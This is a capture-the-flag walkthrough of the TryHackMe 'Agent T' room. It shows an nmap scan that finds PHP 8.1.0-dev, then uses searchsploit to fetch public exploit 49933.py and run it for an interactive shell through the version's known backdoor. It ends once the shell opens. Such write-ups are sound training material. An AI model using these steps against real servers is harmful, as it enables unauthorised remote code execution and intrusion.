Agent T — Room Walkthrough

Agent T is an easy TryHackMe machine that highlights initial web service enumeration and remote code execution via an intentional backdoor present in PHP 8.1.0-dev.

01. Reconnaissance & Enumeration

Searching through the website directly and intercepting traffic in Burp Suite did not reveal vulnerable functional endpoints. An initial Nmap service scan was run against the target IP address:

┌──(bisc㉿kali)-[~]
 └─$ nmap -A -sC 10.113.132.144
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 08:07 -0400
Nmap scan report for 10.113.132.144
Host is up (0.063s latency).
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: Admin Dashboard
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

The scan shows HTTP open on port 80 running PHP 8.1.0-dev. This target version contains a public backdoor vulnerability permitting arbitrary command execution.

02. Exploitation

I searched for the exploit script using searchsploit but you can also search it from Exploit-DB:

┌──(bisc㉿kali)-[~]
 └─$ searchsploit PHP 8.1.0-dev

  # In the output
  PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution        | php/webapps/49933.py

The exploit script can be obtained using searchsploit or directly downloaded from Exploit-DB:

┌──(bisc㉿kali)-[~]
 └─$ searchsploit -m php/webapps/49933.py

Executing the Python script we've got against the web URL, it will give us an interactive shell session:

┌──(bisc㉿kali)-[~]
 └─$ python 49933.py
# Target URL: http://10.113.132.144/
# Interactive shell is opened on http://10.113.132.144/
# Can't access tty; job control turned off.
